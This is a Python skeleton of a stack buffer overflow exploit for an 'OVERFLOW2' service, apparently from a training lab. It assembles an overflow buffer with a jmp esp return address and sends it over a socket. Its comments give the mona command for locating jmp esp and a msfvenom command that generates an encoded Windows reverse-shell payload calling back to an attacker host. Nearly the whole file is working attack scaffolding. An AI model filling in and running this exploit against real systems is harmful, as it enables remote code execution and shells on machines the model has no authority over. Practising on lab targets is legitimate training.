import socket

ip = "<ip>"
port = <port>

prefix = "OVERFLOW2 "
# ENTER OFFSET
offset = <offset>
overflow = "A" * offset

# Enter address found from 'jmp esp'
# !mona jmp -r esp -cpb "\x00<ALLBADCHARS>"
# in little endian -> Reverse order
# eg 01020304 -> \x04\x03\x02\x01
retn = ""

padding = ""

# msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 EXITFUNC=thread -b "\x00<BAD-CHARS>" â€“e x86/shikata_ga_nai -f c
payload = (
  TODO
)

postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
